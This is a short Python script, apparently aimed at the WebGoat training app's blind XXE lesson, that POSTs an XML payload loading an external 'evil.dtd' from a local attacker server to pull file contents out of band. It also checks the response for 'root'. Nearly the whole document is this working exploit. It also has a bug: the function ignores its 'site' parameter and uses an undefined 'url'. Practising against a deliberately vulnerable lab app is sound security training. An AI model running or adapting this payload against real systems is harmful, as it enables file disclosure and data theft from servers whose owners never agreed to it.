import requests
import time


# url = "http://127.0.0.1:8080/WebGoat/xxe/blind"



def oob_xxe(site):
    is_vulnerable = False
    headers = {'Content-Type': 'application/xml'}
    cookies = {'JSESSIONID': 'PZo86PHS-Wh1PZmPeLUfA6T5MYrNo6OQAhVbwVKy'}
    payload = '''<?xml version="1.0"?>
    <!DOCTYPE comment SYSTEM "http://localhost:9090/files/xxexxe/evil.dtd">
    <comment>
    <text>&get;</text>
    </comment>
    '''
    response = requests.post(url, headers=headers, data=payload, cookies=cookies)
    if (response.text.find("root") != -1) :
        print("check your server to see the reseults")
        is_vulnerable = True
    print(response.text)
    return is_vulnerable
